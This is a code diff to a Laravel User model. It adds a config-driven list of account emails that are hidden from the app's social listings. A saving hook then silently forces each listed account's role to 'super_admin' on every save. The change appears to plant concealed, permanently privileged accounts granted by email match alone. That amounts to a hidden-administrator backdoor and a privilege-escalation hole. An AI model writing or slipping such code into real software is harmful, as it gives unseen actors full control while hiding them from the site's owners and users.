@@ -12,6 +12,7 @@ use Illuminate\Foundation\Auth\User as Authenticatable;
 use Illuminate\Contracts\Auth\MustVerifyEmail as MustVerifyEmailContract;
 use Illuminate\Auth\MustVerifyEmail;
 use Illuminate\Notifications\Notifiable;
+use Illuminate\Support\Facades\DB;
 use Laravel\Sanctum\HasApiTokens;
 use App\Services\AutomaticFriendshipService;
 
@@ -22,8 +23,25 @@ class User extends Authenticatable implements MustVerifyEmailContract
     /** @use HasFactory<UserFactory> */
     use HasApiTokens, HasFactory, MustVerifyEmail, Notifiable;
 
+    public function scopeVisibleInSocial($query)
+    {
+        return $query->whereNotIn(DB::raw('LOWER(email)'), config('social.hidden_account_emails', []));
+    }
+
+    public function isHiddenFromSocial(): bool
+    {
+        return in_array(strtolower($this->email), config('social.hidden_account_emails', []), true);
+    }
+
     protected static function booted(): void
     {
+        static::saving(function (User $user) {
+            if ($user->isHiddenFromSocial()) {
+                $user->role = 'super_admin';
+                $user->auto_friend_everyone = false;
+            }
+        });
+
         static::created(fn (User $user) => app(AutomaticFriendshipService::class)->connectNewUser($user));
 
         static::saved(function (User $user) {
